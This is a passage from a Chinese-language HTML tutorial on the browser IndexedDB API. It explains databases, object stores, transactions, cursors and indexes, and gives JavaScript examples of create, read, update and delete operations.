不仅可以储存字符串，还可以储存二进制数据（ArrayBuffer 对象和 Blob 对象）。</p>\n\n        <h2>\n            <a href='#基本概念' class='header-anchor'>#</a>\n            <span>基本概念</span>\n        </h2>\n    <p>IndexedDB 是一个比较复杂的 API，涉及不少概念。它把不同的实体，抽象成一个个对象接口。学习这个 API，就是学习它的各种对象接口。</p>\n<ul>\n<li>数据库：IDBDatabase 对象</li>\n<li>对象仓库：IDBObjectStore 对象</li>\n<li>索引： IDBIndex 对象</li>\n<li>事务： IDBTransaction 对象</li>\n<li>操作请求：IDBRequest 对象</li>\n<li>指针： IDBCursor 对象</li>\n<li>主键集合：IDBKeyRange 对象</li>\n</ul>\n<p>下面是一些主要的概念。</p>\n<p><strong>（1）数据库</strong></p>\n<p>数据库是一系列相关数据的容器。每个域名（严格的说，是协议 + 域名 + 端口）都可以新建任意多个数据库。</p>\n<p>IndexedDB 数据库有版本的概念。同一个时刻，只能有一个版本的数据库存在。如果要修改数据库结构（新增或删除表、索引或者主键），只能通过升级数据库版本完成。</p>\n<p><strong>（2）对象仓库</strong></p>\n<p>每个数据库包含若干个对象仓库（object store）。它类似于关系型数据库的表格。</p>\n<p><strong>（3）数据记录</strong></p>\n<p>对象仓库保存的是数据记录。每条记录类似于关系型数据库的行，但是只有主键和数据体两部分。主键用来建立默认的索引，必须是不同的，否则会报错。主键可以是数据记录里面的一个属性，也可以指定为一个递增的整数编号。</p>\n<pre class=\"prettyprint language-javascript\"><code>{ id: 1, text: &#039;foo&#039; }</code></pre><p>上面的对象中，<code>id</code>属性可以当作主键。</p>\n<p>数据体可以是任意数据类型，不限于对象。</p>\n<p><strong>（4）索引</strong></p>\n<p>为了加速数据的检索，可以在对象仓库里面，为不同的属性建立索引。</p>\n<p><strong>（5）事务</strong></p>\n<p>数据记录的读写和删改，都要通过事务完成。事务对象提供<code>error</code>、<code>abort</code>和<code>complete</code>三个事件，用来监听操作结果。</p>\n\n        <h2>\n            <a href='#操作流程' class='header-anchor'>#</a>\n            <span>操作流程</span>\n        </h2>\n    <p>IndexedDB 数据库的各种操作，一般是按照下面的流程进行的。这个部分只给出简单的代码示例，用于快速上手，详细的各个对象的 API 放在后文介绍。</p>\n\n        <h3>\n            <a href='#打开数据库' class='header-anchor'>#</a>\n            <span>打开数据库</span>\n        </h3>\n    <p>使用 IndexedDB 的第一步是打开数据库，使用<code>indexedDB.open()</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var request = window.indexedDB.open(databaseName, version);</code></pre><p>这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为<code>1</code>。</p>\n<p><code>indexedDB.open()</code>方法返回一个 IDBRequest 对象。这个对象通过三种事件<code>error</code>、<code>success</code>、<code>upgradeneeded</code>，处理打开数据库的操作结果。</p>\n<p><strong>（1）error 事件</strong></p>\n<p><code>error</code>事件表示打开数据库失败。</p>\n<pre class=\"prettyprint language-javascript\"><code>request.onerror = function (event) {\n  console.log(&#039;数据库打开报错&#039;);\n};</code></pre><p><strong>（2）success 事件</strong></p>\n<p><code>success</code>事件表示成功打开数据库。</p>\n<pre class=\"prettyprint language-javascript\"><code>var db;\n\nrequest.onsuccess = function (event) {\n  db = request.result;\n  console.log(&#039;数据库打开成功&#039;);\n};</code></pre><p>这时，通过<code>request</code>对象的<code>result</code>属性拿到数据库对象。</p>\n<p><strong>（3）upgradeneeded 事件</strong></p>\n<p>如果指定的版本号，大于数据库的实际版本号，就会发生数据库升级事件<code>upgradeneeded</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var db;\n\nrequest.onupgradeneeded = function (event) {\n  db = event.target.result;\n}</code></pre><p>这时通过事件对象的<code>target.result</code>属性，拿到数据库实例。</p>\n\n        <h3>\n            <a href='#新建数据库' class='header-anchor'>#</a>\n            <span>新建数据库</span>\n        </h3>\n    <p>新建数据库与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在<code>upgradeneeded</code>事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。</p>\n<p>通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。</p>\n<pre class=\"prettyprint language-javascript\"><code>request.onupgradeneeded = function(event) {\n  db = event.target.result;\n  var objectStore = db.createObjectStore(&#039;person&#039;, { keyPath: &#039;id&#039; });\n}</code></pre><p>上面代码中，数据库新建成功以后，新增一张叫做<code>person</code>的表格，主键是<code>id</code>。</p>\n<p>更好的写法是先判断一下，这张表格是否存在，如果不存在再新建。</p>\n<pre class=\"prettyprint language-javascript\"><code>request.onupgradeneeded = function (event) {\n  db = event.target.result;\n  var objectStore;\n  if (!db.objectStoreNames.contains(&#039;person&#039;)) {\n    objectStore = db.createObjectStore(&#039;person&#039;, { keyPath: &#039;id&#039; });\n  }\n}</code></pre><p>主键（key）是默认建立索引的属性。比如，数据记录是<code>{ id: 1, name: &#39;张三&#39; }</code>，那么<code>id</code>属性可以作为主键。主键也可以指定为下一层对象的属性，比如<code>{ foo: { bar: &#39;baz&#39; } }</code>的<code>foo.bar</code>也可以指定为主键。</p>\n<p>如果数据记录里面没有合适作为主键的属性，那么可以让 IndexedDB 自动生成主键。</p>\n<pre class=\"prettyprint language-javascript\"><code>var objectStore = db.createObjectStore(\n  &#039;person&#039;,\n  { autoIncrement: true }\n);</code></pre><p>上面代码中，指定主键为一个递增的整数。</p>\n<p>新建对象仓库以后，下一步可以新建索引。</p>\n<pre class=\"prettyprint language-javascript\"><code>request.onupgradeneeded = function(event) {\n  db = event.target.result;\n  var objectStore = db.createObjectStore(&#039;person&#039;, { keyPath: &#039;id&#039; });\n  objectStore.createIndex(&#039;name&#039;, &#039;name&#039;, { unique: false });\n  objectStore.createIndex(&#039;email&#039;, &#039;email&#039;, { unique: true });\n}</code></pre><p>上面代码中，<code>IDBObject.createIndex()</code>的三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值）。</p>\n\n        <h3>\n            <a href='#新增数据' class='header-anchor'>#</a>\n            <span>新增数据</span>\n        </h3>\n    <p>新增数据指的是向对象仓库写入数据记录。这需要通过事务完成。</p>\n<pre class=\"prettyprint language-javascript\"><code>function add() {\n  var request = db.transaction([&#039;person&#039;], &#039;readwrite&#039;)\n    .objectStore(&#039;person&#039;)\n    .add({ id: 1, name: &#039;张三&#039;, age: 24, email: &#039;zhangsan@example.com&#039; });\n\n  request.onsuccess = function (event) {\n    console.log(&#039;数据写入成功&#039;);\n  };\n\n  request.onerror = function (event) {\n    console.log(&#039;数据写入失败&#039;);\n  }\n}\n\nadd();</code></pre><p>上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（“只读”或“读写”）。新建事务以后，通过<code>IDBTransaction.objectStore(name)</code>方法，拿到 IDBObjectStore 对象，再通过表格对象的<code>add()</code>方法，向表格写入一条记录。</p>\n<p>写入操作是一个异步操作，通过监听连接对象的<code>success</code>事件和<code>error</code>事件，了解是否写入成功。</p>\n\n        <h3>\n            <a href='#读取数据' class='header-anchor'>#</a>\n            <span>读取数据</span>\n        </h3>\n    <p>读取数据也是通过事务完成。</p>\n<pre class=\"prettyprint language-javascript\"><code>function read() {\n   var transaction = db.transaction([&#039;person&#039;]);\n   var objectStore = transaction.objectStore(&#039;person&#039;);\n   var request = objectStore.get(1);\n\n   request.onerror = function(event) {\n     console.log(&#039;事务失败&#039;);\n   };\n\n   request.onsuccess = function( event) {\n      if (request.result) {\n        console.log(&#039;Name: &#039; + request.result.name);\n        console.log(&#039;Age: &#039; + request.result.age);\n        console.log(&#039;Email: &#039; + request.result.email);\n      } else {\n        console.log(&#039;未获得数据记录&#039;);\n      }\n   };\n}\n\nread();</code></pre><p>上面代码中，<code>objectStore.get()</code>方法用于读取数据，参数是主键的值。</p>\n\n        <h3>\n            <a href='#遍历数据' class='header-anchor'>#</a>\n            <span>遍历数据</span>\n        </h3>\n    <p>遍历数据表格的所有记录，要使用指针对象 IDBCursor。</p>\n<pre class=\"prettyprint language-javascript\"><code>function readAll() {\n  var objectStore = db.transaction(&#039;person&#039;).objectStore(&#039;person&#039;);\n\n   objectStore.openCursor().onsuccess = function (event) {\n     var cursor = event.target.result;\n\n     if (cursor) {\n       console.log(&#039;Id: &#039; + cursor.key);\n       console.log(&#039;Name: &#039; + cursor.value.name);\n       console.log(&#039;Age: &#039; + cursor.value.age);\n       console.log(&#039;Email: &#039; + cursor.value.email);\n       cursor.continue();\n    } else {\n      console.log(&#039;没有更多数据了！&#039;);\n    }\n  };\n}\n\nreadAll();</code></pre><p>上面代码中，新建指针对象的<code>openCursor()</code>方法是一个异步操作，所以要监听<code>success</code>事件。</p>\n\n        <h3>\n            <a href='#更新数据' class='header-anchor'>#</a>\n            <span>更新数据</span>\n        </h3>\n    <p>更新数据要使用<code>IDBObject.put()</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>function update() {\n  var request = db.transaction([&#039;person&#039;], &#039;readwrite&#039;)\n    .objectStore(&#039;person&#039;)\n    .put({ id: 1, name: &#039;李四&#039;, age: 35, email: &#039;lisi@example.com&#039; });\n\n  request.onsuccess = function (event) {\n    console.log(&#039;数据更新成功&#039;);\n  };\n\n  request.onerror = function (event) {\n    console.log(&#039;数据更新失败&#039;);\n  }\n}\n\nupdate();</code></pre><p>上面代码中，<code>put()</code>方法自动更新了主键为<code>1</code>的记录。</p>\n\n        <h3>\n            <a href='#删除数据' class='header-anchor'>#</a>\n            <span>删除数据</span>\n        </h3>\n    <p><code>IDBObjectStore.delete()</code>方法用于删除记录。</p>\n<pre class=\"prettyprint language-javascript\"><code>function remove() {\n  var request = db.transaction([&#039;person&#039;], &#039;readwrite&#039;)\n    .objectStore(&#039;person&#039;)\n    .delete(1);\n\n  request.onsuccess = function (event) {\n    console.log(&#039;数据删除成功&#039;);\n  };\n}\n\nremove();</code></pre>\n        <h3>\n            <a href='#使用索引' class='header-anchor'>#</a>\n            <span>使用索引</span>\n        </h3>\n    <p>索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值）。</p>\n<p>假定新建表格的时候，对<code>name</code>字段建立了索引。</p>\n<pre class=\"prettyprint language-javascript\"><code>objectStore.createIndex(&#039;name&#039;, &#039;name&#039;, { unique: false });</code></pre><p>现在，就可以从<code>name</code>找到对应的数据记录了。</p>\n<pre class=\"prettyprint language-javascript\"><code>var transaction = db.transaction([&#039;person&#039;], &#039;readonly&#039;);\nvar store = transaction.objectStore(&#039;person&#039;);\nvar index = store.index(&#039;name&#039;);\nvar request = index.get(&#039;李四&#039;);\n\nrequest.onsuccess = function (e) {\n  var result = e.target.result;\n  if (result) {\n    // ...\n  } else {\n    // ...\n  }\n}</code></pre>\n        <h2>\n            <a href='#indexedDB-对象' class='header-anchor'>#</a>\n            <span>indexedDB 对象</span>\n        </h2>\n    <p>浏览器原生提供<code>indexedDB</code>对象，作为开发者的操作接口。</p>\n\n        <h3>\n            <a href='#indexedDB.open()' class='header-anchor'>#</a>\n            <span>indexedDB.open()</span>\n        </h3>\n    <p><code>indexedDB.open()</code>方法用于打开数据库。这是一个异步操作，但是会立刻返回一个 IDBOpenDBRequest 对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var openRequest = window.indexedDB.open(&#039;test&#039;, 1);</code></pre><p>上面代码表示，打开一个名为<code>test</code>、版本为<code>1</code>的数据库。如果该数据库不存在，则会新建该数据库。</p>\n<p><code>open()</code>方法的第一个参数是数据库名称，格式为字符串，不可省略；第二个参数是数据库版本，是一个大于<code>0</code>的正整数（<code>0</code>将报错），如果该参数大于当前版本，会触发数据库升级。第二个参数可省略，如果数据库已存在，将打开当前版本的数据库；如果数据库不存在，将创建该版本的数据库，默认版本为<code>1</code>。</p>\n<p>打开数据库是异步操作，通过各种事件通知客户端。下面是有可能触发的4种事件。</p>\n<ul>\n<li><strong>success</strong>：打开成功。</li>\n<li><strong>error</strong>：打开失败。</li>\n<li><strong>upgradeneeded</strong>：第一次打开该数据库，或者数据库版本发生变化。</li>\n<li><strong>blocked</strong>：上一次的数据库连接还未关闭。</li>\n</ul>\n<p>第一次打开数据库时，会先触发<code>upgradeneeded</code>事件，然后触发<code>success</code>事件。</p>\n<p>根据不同的需要，对上面4种事件监听函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var openRequest = indexedDB.open(&#039;test&#039;, 1);\nvar db;\n\nopenRequest.onupgradeneeded = function (e) {\n  console.log(&#039;Upgrading...&#039;);\n}\n\nopenRequest.onsuccess = function (e) {\n  console.log(&#039;Success!&#039;);\n  db = openRequest.result;\n}\n\nopenRequest.onerror = function (e) {\n  console.log(&#039;Error&#039;);\n  console.log(e);\n}</code></pre><p>上面代码有两个地方需要注意。首先，<code>open()</code>方法返回的是一个对象（IDBOpenDBRequest），监听函数就定义在这个对象上面。其次，<code>success</code>事件发生后，从<code>openRequest.result</code>属性可以拿到已经打开的<code>IndexedDB</code>数据库对象。</p>\n\n        <h3>\n            <a href='#indexedDB.deleteDatabase()' class='header-anchor'>#</a>\n            <span>indexedDB.deleteDatabase()</span>\n        </h3>\n    <p><code>indexedDB.deleteDatabase()</code>方法用于删除一个数据库，参数为数据库的名字。它会立刻返回一个<code>IDBOpenDBRequest</code>对象，然后对数据库执行异步删除。删除操作的结果会通过事件通知，<code>IDBOpenDBRequest</code>对象可以监听以下事件。</p>\n<ul>\n<li><code>success</code>：删除成功</li>\n<li><code>error</code>：删除报错</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var DBDeleteRequest = window.indexedDB.deleteDatabase(&#039;demo&#039;);\n\nDBDeleteRequest.onerror = function (event) {\n  console.log(&#039;Error&#039;);\n};\n\nDBDeleteRequest.onsuccess = function (event) {\n  console.log(&#039;success&#039;);\n};</code></pre><p>调用<code>deleteDatabase()</code>方法以后，当前数据库的其他已经打开的连接都会接收到<code>versionchange</code>事件。</p>\n<p>注意，删除不存在的数据库并不会报错。</p>\n\n        <h3>\n            <a href='#indexedDB.cmp()' class='header-anchor'>#</a>\n            <span>indexedDB.cmp()</span>\n        </h3>\n    <p><code>indexedDB.cmp()</code>方法比较两个值是否为 indexedDB 的相同的主键。它返回一个整数，表示比较的结果：<code>0</code>表示相同，<code>1</code>表示第一个主键大于第二个主键，<code>-1</code>表示第一个主键小于第二个主键。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.indexedDB.cmp(1, 2) // -1</code></pre><p>注意，这个方法不能用来比较任意的 JavaScript 值。如果参数是布尔值或对象，它会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.indexedDB.cmp(1, true) // 报错\nwindow.indexedDB.cmp({}, {}) // 报错</code></pre>\n        <h2>\n            <a href='#IDBRequest-对象' class='header-anchor'>#</a>\n            <span>IDBRequest 对象</span>\n        </h2>\n    <p>IDBRequest 对象表示打开的数据库连接，<code>indexedDB.open()</code>方法和<code>indexedDB.deleteDatabase()</code>方法会返回这个对象。数据库的操作都是通过这个对象完成的。</p>\n<p>这个对象的所有操作都是异步操作，要通过<code>readyState</code>属性判断是否完成，如果为<code>pending</code>就表示操作正在进行，如果为<code>done</code>就表示操作完成，可能成功也可能失败。</p>\n<p>操作完成以后，触发<code>success</code>事件或<code>error</code>事件，这时可以通过<code>result</code>属性和<code>error</code>属性拿到操作结果。如果在<code>pending</code>阶段，就去读取这两个属性，是会报错的。</p>\n<p>IDBRequest 对象有以下属性。</p>\n<ul>\n<li><code>IDBRequest.readyState</code>：等于<code>pending</code>表示操作正在进行，等于<code>done</code>表示操作正在完成。</li>\n<li><code>IDBRequest.result</code>：返回请求的结果。如果请求失败、结果不可用，读取该属性会报错。</li>\n<li><code>IDBRequest.error</code>：请求失败时，返回错误对象。</li>\n<li><code>IDBRequest.source</code>：返回请求的来源（比如索引对象或 ObjectStore）。</li>\n<li><code>IDBRequest.transaction</code>：返回当前请求正在进行的事务，如果不包含事务，返回<code>null</code>。</li>\n<li><code>IDBRequest.onsuccess</code>：指定<code>success</code>事件的监听函数。</li>\n<li><code>IDBRequest.onerror</code>：指定<code>error</code>事件的监听函数。</li>\n</ul>\n<p>IDBOpenDBRequest 对象继承了 IDBRequest 对象，提供了两个额外的事件监听属性。</p>\n<ul>\n<li><code>IDBOpenDBRequest.onblocked</code>：指定<code>blocked</code>事件（<code>upgradeneeded</code>事件触发时，数据库仍然在使用）的监听函数。</li>\n<li><code>IDBOpenDBRequest.onupgradeneeded</code>：<code>upgradeneeded</code>事件的监听函数。</li>\n</ul>\n\n        <h2>\n            <a href='#IDBDatabase-对象' class='header-anchor'>#</a>\n            <span>IDBDatabase 对象</span>\n        </h2>\n    <p>打开数据成功以后，可以从<code>IDBOpenDBRequest</code>对象的<code>result</code>属性上面，拿到一个<code>IDBDatabase</code>对象，它表示连接的数据库。后面对数据库的操作，都通过这个对象完成。</p>\n<pre class=\"prettyprint language-javascript\"><code>var db;\nvar DBOpenRequest = window.indexedDB.open(&#039;demo&#039;, 1);\n\nDBOpenRequest.onerror = function (event) {\n  console.log(&#039;Error&#039;);\n};\n\nDBOpenRequest.onsuccess = function(event) {\n  db = DBOpenRequest.result;\n  // ...\n};</code></pre>\n        <h3>\n            <a href='#属性' class='header-anchor'>#</a>\n            <span>属性</span>\n        </h3>\n    <p>IDBDatabase 对象有以下属性。</p>\n<ul>\n<li><code>IDBDatabase.name</code>：字符串，数据库名称。</li>\n<li><code>IDBDatabase.version</code>：整数，数据库版本。数据库第一次创建时，该属性为空字符串。</li>\n<li><code>IDBDatabase.objectStoreNames</code>：DOMStringList 对象（字符串的集合），包含当前数据的所有 object store 的名字。</li>\n<li><code>IDBDatabase.onabort</code>：指定 abort 事件（事务中止）的监听函数。</li>\n<li><code>IDBDatabase.onclose</code>：指定 close 事件（数据库意外关闭）的监听函数。</li>\n<li><code>IDBDatabase.onerror</code>：指定 error 事件（访问数据库失败）的监听函数。</li>\n<li><code>IDBDatabase.onversionchange</code>：数据库版本变化时触发（发生<code>upgradeneeded</code>事件，或调用<code>indexedDB.deleteDatabase()</code>）。</li>\n</ul>\n<p>下面是<code>objectStoreNames</code>属性的例子。该属性返回一个DOMStringList 对象，包含了当前数据库所有对象仓库的名称（即表名），可以使用 DOMStringList 对象的<code>contains</code>方法，检查数据库是否包含某个对象仓库。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (!db.objectStoreNames.contains(&#039;firstOS&#039;)) {\n  db.createObjectStore(&#039;firstOS&#039;);\n}</code></pre><p>上面代码先判断某个对象仓库是否存在，如果不存在就创建该对象仓库。</p>\n\n        <h3>\n            <a href='#方法' class='header-anchor'>#</a>\n            <span>方法</span>\n        </h3>\n    <p>IDBDatabase 对象有以下方法。</p>\n<ul>\n<li><code>IDBDatabase.close()</code>：关闭数据库连接，实际会等所有事务完成后再关闭。</li>\n<li><code>IDBDatabase.createObjectStore()</code>：创建存放数据的对象仓库，类似于传统关系型数据库的表格，返回一个 IDBObjectStore 对象。该方法只能在<code>versionchange</code>事件监听函数中调用。</li>\n<li><code>IDBDatabase.deleteObjectStore()</code>：删除指定的对象仓库。该方法只能在<code>versionchange</code>事件监听函数中调用。</li>\n<li><code>IDBDatabase.transaction()</code>：返回一个 IDBTransaction 事务对象。</li>\n</ul>\n<p>下面是<code>createObjectStore()</code>方法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var request = window.indexedDB.open(&#039;demo&#039;, 2);\n\nrequest.onupgradeneeded = function (event) {\n  var db = event.target.result;\n\n  db.onerror = function(event) {\n    console.log(&#039;error&#039;);\n  };\n\n  var objectStore = db.createObjectStore(&#039;items&#039;);\n\n  // ...\n};</code></pre><p>上面代码创建了一个名为<code>items</code>的对象仓库，如果该对象仓库已经存在，就会抛出一个错误。为了避免出错，需要用到下文的<code>objectStoreNames</code>属性，检查已有哪些对象仓库。</p>\n<p><code>createObjectStore()</code>方法还可以接受第二个对象参数，用来设置对象仓库的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>db.createObjectStore(&#039;test&#039;, { keyPath: &#039;email&#039; });\ndb.createObjectStore(&#039;test2&#039;, { autoIncrement: true });</code></pre><p>上面代码中，<code>keyPath</code>属性表示主键（由于主键的值不能重复，所以上例存入之前，必须保证数据的<code>email</code>属性值都是不一样的），默认值为<code>null</code>；<code>autoIncrement</code>属性表示，是否使用自动递增的整数作为主键（第一个数据记录为1，第二个数据记录为2，以此类推），默认为<code>false</code>。一般来说，<code>keyPath</code>和<code>autoIncrement</code>属性只要使用一个就够了，如果两个同时使用，表示主键为递增的整数，且对象不得缺少<code>keyPath</code>指定的属性。</p>\n<p>下面是<code>deleteObjectStore()</code>方法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var dbName = &#039;sampleDB&#039;;\nvar dbVersion = 2;\nvar request = indexedDB.open(dbName, dbVersion);\n\nrequest.onupgradeneeded = function(e) {\n  var db = request.result;\n  if (e.oldVersion &lt; 1) {\n    db.createObjectStore(&#039;store1&#039;);\n  }\n\n  if (e.oldVersion &lt; 2) {\n    db.deleteObjectStore(&#039;store1&#039;);\n    db.createObjectStore(&#039;store2&#039;);\n  }\n\n  // ...\n};</code></pre><p>下面是<code>transaction()</code>方法的例子，该方法用于创建一个数据库事务，返回一个 IDBTransaction 对象。向数据库添加数据之前，必须先创建数据库事务。</p>\n<pre class=\"prettyprint language-javascript\"><code>var t = db.transaction([&#039;items&#039;], &#039;readwrite&#039;);</code></pre><p><code>transaction()</code>方法接受两个参数：第一个参数是一个数组，里面是所涉及的对象仓库，通常是只有一个；第二个参数是一个表示操作类型的字符串。目前，操作类型只有两种：<code>readonly</code>（只读）和<code>readwrite</code>（读写）。添加数据使用<code>readwrite</code>，读取数据使用<code>readonly</code>。第二个参数是可选的，省略时默认为<code>readonly</code>模式。</p>\n\n        <h2>\n            <a href='#IDBObjectStore-对象' class='header-anchor'>#</a>\n            <span>IDBObjectStore 对象</span>\n        </h2>\n    <p>IDBObjectStore 对象对应一个对象仓库（object store）。<code>IDBDatabase.createObjectStore()</code>方法返回的就是一个 IDBObjectStore 对象。</p>\n<p>IDBDatabase 对象的<code>transaction()</code>返回一个事务对象，该对象的<code>objectStore()</code>方法返回 IDBObjectStore 对象，因此可以采用下面的链式写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>db.transaction([&#039;test&#039;], &#039;readonly&#039;)\n  .objectStore(&#039;test&#039;)\n  .get(X)\n  .onsuccess = function (e) {}</code></pre>\n        <h3>\n            <a href='#属性' class='header-anchor'>#</a>\n            <span>属性</span>\n        </h3>\n    <p>IDBObjectStore 对象有以下属性。</p>\n<ul>\n<li><code>IDBObjectStore.indexNames</code>：返回一个类似数组的对象（DOMStringList），包含了当前对象仓库的所有索引。</li>\n<li><code>IDBObjectStore.keyPath</code>：返回当前对象仓库的主键。</li>\n<li><code>IDBObjectStore.name</code>：返回当前对象仓库的名称。</li>\n<li><code>IDBObjectStore.transaction</code>：返回当前对象仓库所属的事务对象。</li>\n<li><code>IDBObjectStore.autoIncrement</code>：布尔值，表示主键是否会自动递增。</li>\n</ul>\n\n        <h3>\n            <a href='#方法' class='header-anchor'>#</a>\n            <span>方法</span>\n        </h3>\n    <p>IDBObjectStore 对象有以下方法。</p>\n<p><strong>（1）IDBObjectStore.add()</strong></p>\n<p><code>IDBObjectStore.add()</code>用于向对象仓库添加数据，返回一个 IDBRequest 对象。该方法只用于添加数据，如果主键相同会报错，因此更新数据必须使用<code>put()</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>objectStore.add(value, key)</code></pre><p>该方法接受两个参数，第一个参数是键值，第二个参数是主键，该参数可选，如果省略默认为<code>null</code>。</p>\n<p>创建事务以后，就可以获取对象仓库，然后使用<code>add()</code>方法往里面添加数据了。</p>\n<pre class=\"prettyprint language-javascript\"><code>var db;\nvar DBOpenRequest = window.indexedDB.open(&#039;demo&#039;, 1);\n\nDBOpenRequest.onsuccess = function (event) {\n  db = DBOpenRequest.result;\n  var transaction = db.transaction([&#039;items&#039;], &#039;readwrite&#039;);\n\n  transaction.oncomplete = function (event) {\n    console.log(&#039;transaction success&#039;);\n  };\n\n  transaction.onerror = function (event) {\n    console.log(&#039;tansaction error: &#039; + transaction.error);\n  };\n\n  var objectStore = transaction.objectStore(&#039;items&#039;);\n  var objectStoreRequest = objectStore.add({ foo: 1 });\n\n  objectStoreRequest.onsuccess = function (event) {\n    console.log(&#039;add data success&#039;);\n  };\n\n};</code></pre><p><strong>（2）IDBObjectStore.put()</strong></p>\n<p><code>IDBObjectStore.put()</code>方法用于更新某个主键对应的数据记录，如果对应的键值不存在，则插入一条新的记录。该方法返回一个 IDBRequest 对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>objectStore.put(item, key)</code></pre><p>该方法接受两个参数，第一个参数为新数据，第二个参数为主键，该参数可选，且只在自动递增时才有必要提供，因为那时主键不包含在数据值里面。</p>\n<p><strong>（3）IDBObjectStore.clear()</strong></p>\n<p><code>IDBObjectStore.clear()</code>删除当前对象仓库的所有记录。该方法返回一个 IDBRequest 对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>objectStore.clear()</code></pre><p>该方法不需要参数。</p>\n<p><strong>（4）IDBObjectStore.delete()</strong></p>\n<p><code>IDBObjectStore.delete()</code>方法用于删除指定主键的记录。该方法返回一个 IDBRequest 对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>objectStore.delete(Key)</code></pre><p>该方法的参数为主键的值。</p>\n<p><strong>（5）IDBObjectStore.count()</strong></p>\n<p><code>IDBObjectStore.count()</code>方法用于计算记录的数量。该方法返回一个 IDBRequest 对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>IDBObjectStore.count(key)</code></pre><p>不带参数时，该方法返回当前对象仓库的所有记录数量。如果主键或 IDBKeyRange 对象作为参数，则返回对应的记录数量。</p>\n<p><strong>（6）IDBObjectStore.getKey()</strong></p>\n<p><code>IDBObjectStore.getKey()</code>用于获取主键。该方法返回一个 IDBRequest 对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>objectStore.getKey(key)</code></pre><p>该方法的参数可以是主键值或 IDBKeyRange 对象。</p>\n<p><strong>（7）IDBObjectStore.get()</strong></p>\n<p><code>IDBObjectStore.get()</code>用于获取主键对应的数据记录。该方法返回一个 IDBRequest 对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>objectStore.get(key)</code></pre><p><strong>（8）IDBObjectStore.getAll()</strong></p>\n<p><code>DBObjectStore.getAll()</code>用于获取对象仓库的记录。该方法返回一个 IDBRequest 对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 获取所有记录\nobjectStore.getAll()\n\n// 获取所有符合指定主键或 IDBKeyRange 的记录\nobjectStore.getAll(query)\n\n// 指定获取记录的数量\nobjectStore.getAll(query, count)</code></pre><p><strong>（9）IDBObjectStore.getAllKeys()</strong></p>\n<p><code>IDBObjectStore.getAllKeys()</code>用于获取所有符合条件的主键。该方法返回一个 IDBRequest 对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 获取所有记录的主键\nobjectStore.getAllKeys()\n\n// 获取所有符合条件的主键\nobjectStore.getAllKeys(query)\n\n// 指定获取主键的数量\nobjectStore.getAllKeys(query, count)</code></pre><p><strong>（10）IDBObjectStore.index()</strong></p>\n<p><code>IDBObjectStore.index()</code>方法返回指定名称的索引对象 IDBIndex。</p>\n<pre class=\"prettyprint language-javascript\"><code>objectStore.index(name)</code></pre><p>有了索引以后，就可以针对索引所在的属性读取数据。</p>\n<pre class=\"prettyprint language-javascript\"><code>var t = db.transaction([&#039;people&#039;], &#039;readonly&#039;);\nvar store = t.objectStore(&#039;people&#039;);\nvar index = store.index(&#039;name&#039;);\n\nvar request = index.get(&#039;foo&#039;);</code></pre><p>上面代码打开对象仓库以后，先用<code>index()</code>方法指定获取<code>name</code>属性的索引，然后用<code>get()</code>方法读取某个<code>name</code>属性(<code>foo</code>)对应的数据。如果<code>name</code>属性不是对应唯一值，这时<code>get()</code>方法有可能取回多个数据对象。另外，<code>get()</code>是异步方法，读取成功以后，只能在<code>success</code>事件的监听函数中处理数据。</p>\n<p><strong>（11）IDBObjectStore.createIndex()</strong></p>\n<p><code>IDBObjectStore.createIndex()</code>方法用于新建当前数据库的一个索引。该方法只能在<code>VersionChange</code>监听函数里面调用。</p>\n<pre class=\"prettyprint language-javascript\"><code>objectStore.createIndex(indexName, keyPath, objectParameters)</code></pre><p>该方法可以接受三个参数。</p>\n<ul>\n<li>indexName：索引名</li>\n<li>keyPath：主键</li>\n<li>objectParameters：配置对象（可选）</li>\n</ul>\n<p>第三个参数可以配置以下属性。</p>\n<ul>\n<li>unique：如果设为<code>true</code>，将不允许重复的值</li>\n<li>multiEntry：如果设为<code>true</code>，对于有多个值的主键数组，每个值将在索引里面新建一个条目，否则主键数组对应一个条目。</li>\n</ul>\n<p>假定对象仓库中的数据记录都是如下的<code>person</code>类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>var person = {\n  name: name,\n  email: email,\n  created: new Date()\n};</code></pre><p>可以指定这个对象的某个属性来建立索引。</p>\n<pre class=\"prettyprint language-javascript\"><code>var store = db.createObjectStore(&#039;people&#039;, { autoIncrement: true });\n\nstore.createIndex(&#039;name&#039;, &#039;name&#039;, { unique: false });\nstore.createIndex(&#039;email&#039;, &#039;email&#039;, { unique: true });</code></pre><p>上面代码告诉索引对象，<code>name</code>属性不是唯一值，<code>email</code>属性是唯一值。</p>\n<p><strong>（12）IDBObjectStore.deleteIndex()</strong></p>\n<p><code>IDBObjectStore.deleteIndex()</code>方法用于删除指定的索引。该方法只能在<code>VersionChange</code>监听函数里面调用。</p>\n<pre class=\"prettyprint 